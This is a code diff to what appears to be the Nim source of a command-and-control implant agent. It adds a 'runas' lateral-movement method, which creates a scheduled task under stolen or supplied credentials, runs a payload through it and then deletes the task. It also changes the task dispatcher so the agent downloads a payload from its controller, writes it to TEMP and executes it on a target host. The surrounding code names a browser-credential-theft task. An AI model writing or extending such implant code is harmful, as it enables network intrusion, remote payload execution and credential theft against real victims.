@@ -766,6 +766,17 @@ proc doLateral(meth, host, user, pass, cmd: string): string =
     out2.add(runShell("schtasks /Delete /S " & host & " /TN " & tn & " /F 2>&1") & "\n")
     if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete 2>&1")
     return out2
+  elif meth == "runas":
+    # Run payload as local user via scheduled task
+    let tn = "endgame_ru"
+    let ru = if user.startsWith(".\\") or user.startsWith("./"): user[2..^1] else: user
+    var out2 = ""
+    out2.add(runShell("schtasks /Create /SC ONCE /ST 00:00 /F /TN " & tn &
+      " /TR \"\\\"" & cmd & "\\\"\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1") & "\n")
+    out2.add(runShell("schtasks /Run /TN " & tn & " 2>&1") & "\n")
+    Sleep(DWORD(3000))
+    out2.add(runShell("schtasks /Delete /TN " & tn & " /F 2>&1") & "\n")
+    return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & cmd & "\n" & out2
   return "unknown lateral method: " & meth
 
 proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload: seq[byte]) =
@@ -1318,13 +1329,27 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "LATERAL":
     try:
       let j = parseJson(args)
-      let meth = j{"method"}.getStr("atexec")
-      let host = j{"host"}.getStr()
-      let user = j{"user"}.getStr()
-      let pass = j{"pass"}.getStr()
-      let cmd  = j{"cmd"}.getStr()
-      if host == "" or cmd == "":
-        t.sendResult(id, "", "LATERAL requires host and cmd"); return
+      let meth        = j{"method"}.getStr("atexec")
+      let host        = j{"host"}.getStr()
+      let user        = j{"user"}.getStr()
+      let pass        = j{"pass"}.getStr()
+      var cmd         = j{"cmd"}.getStr()
+      let payloadName = j{"payload"}.getStr()
+      # GUI sends payload= (filename) instead of cmd= for JUMP/privesc flows
+      if cmd == "" and payloadName != "":
+        if payloadName == "self":
+          cmd = getAppFilename()
+        else:
+          let payBytes = t.downloadFile(payloadName)
+          if payBytes.len == 0:
+            t.sendResult(id, "", "LATERAL: payload download failed"); return
+          let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
+          writeFile(tmpPath, payBytes)
+          cmd = tmpPath
+      if host == "":
+        t.sendResult(id, "", "LATERAL requires host"); return
+      if cmd == "":
+        t.sendResult(id, "", "LATERAL requires cmd or payload"); return
       t.sendResult(id, doLateral(meth, host, user, pass, cmd), "")
     except: t.sendResult(id, "", "lateral: " & getCurrentExceptionMsg())
   of "BROWSER_CREDS":
